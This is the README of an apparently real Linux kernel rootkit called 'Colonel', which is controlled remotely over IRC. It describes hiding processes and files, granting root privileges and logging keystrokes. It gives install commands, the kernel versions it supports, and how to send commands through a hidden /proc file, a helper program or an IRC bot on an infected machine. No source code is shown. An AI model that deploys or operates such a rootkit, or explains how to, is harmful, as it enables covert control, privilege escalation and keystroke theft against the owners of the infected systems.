## The Colonel Rootkit
Colonel is an experimental linux kernel module (rootkit). Remote communication is handled through IRC. The rootkit is able to hide processes, files, grant root privileges and activate key logging.

## Installation
_Note: channel, server and nickname should be set in irc/bot.py prior to installation._

To install: `./install`
Uninstalling can be accomplished by running `./uninstall`.

Requirements:

- Linux 'vanilla' Kernel >= 2.6.29 _â€“ tested up to 3.6_

## Usage
From infected computer:

`cat /proc/colonel` to see available commands. _File will not be visible on content listing of /proc._

To pass commands use the included program: `sudo ./rtcmd <command>` 
or echo: `echo -n <command> >> /proc/colonel`


From IRC:

If in channel, preface all commands with bot nickname and `:`, i.e. `bot-nickname: <command>`. In private messages or DCC sessions, commands should be passed with out prefix. 

Use `help` to see the  available bot and root commands: `[nickname]: help`
